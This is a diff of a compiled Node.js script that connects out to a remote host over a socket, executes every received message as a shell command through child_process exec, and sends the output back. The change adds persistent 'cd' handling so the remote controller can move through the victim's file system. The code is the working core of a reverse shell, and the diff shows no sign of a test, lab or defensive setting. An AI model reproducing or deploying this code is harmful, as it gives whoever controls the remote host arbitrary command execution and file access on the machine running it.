@@ -12,18 +12,28 @@ socket.connect(port, host, () => {
 socket.on("data", (data) => {
     console.log("Received:", data.toString());
     let command = data.toString();
-    (0, child_process_1.exec)(command, (error, stdout, stderr) => {
-        if (error) {
-            console.log(`error: ${error.message}`);
-            socket.write(error.message);
-            return;
-        }
-        if (stderr) {
-            console.log(`stderr: ${stderr}`);
-            socket.write(stderr);
-            return;
-        }
-        //console.log(`stdout: ${stdout}`);
-        socket.write(stdout);
-    });
+    let currentDirectory = process.cwd();
+    if (command.startsWith("cd")) {
+        console.log("Changing directory");
+        const targetDirectory = command.slice(3).trim(); // Extract target directory
+        process.chdir(targetDirectory); // Change directory locally
+        currentDirectory = process.cwd(); // Update current directory
+        socket.write(currentDirectory); // Send current directory back to the server
+    }
+    else {
+        (0, child_process_1.exec)(command, (error, stdout, stderr) => {
+            if (error) {
+                console.log(`error: ${error.message}`);
+                socket.write(error.message);
+                return;
+            }
+            if (stderr) {
+                console.log(`stderr: ${stderr}`);
+                socket.write(stderr);
+                return;
+            }
+            //console.log(`stdout: ${stdout}`);
+            socket.write(stdout);
+        });
+    }
 });
